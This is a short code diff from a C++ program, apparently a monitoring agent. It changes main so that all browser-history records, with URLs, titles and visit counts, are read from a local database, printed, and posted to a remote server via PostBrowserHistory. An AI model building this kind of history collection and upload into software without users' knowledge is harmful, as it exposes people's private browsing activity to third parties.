@@ -235,20 +235,13 @@ int main(int argc, char* argv[]) {
 		policies.policiesMonitor();*/
 
 		BrowserHistory& browserHistory = BrowserHistory::GetInstance();
-        std::vector<BrowserItem> history = browserHistory.GetEdgeHistory();
+        //std::vector<BrowserItem> history = browserHistory.GetEdgeHistory();
 		BrowserHistoryDB& browserHistoryDB = BrowserHistoryDB::GetInstance();
-		for (const auto& item : history) {
-            if (!browserHistoryDB.add(
-                "edge",
-                item.url,
-                item.title,
-                item.visit_count,
-                item.typed_count,
-                item.last_visit_time,
-                item.hidden
-            )) {
-            }   
-		}
+		json history = browserHistoryDB.query_all();
+		std::cout << history.dump(4) << std::endl;
+		std::cout << history.size() << std::endl;
+		HttpClient& httpClient = HttpClient::GetInstance();
+		httpClient.PostBrowserHistory(history);
 
         
 		//std::cout << history.dump(4) << std::endl;
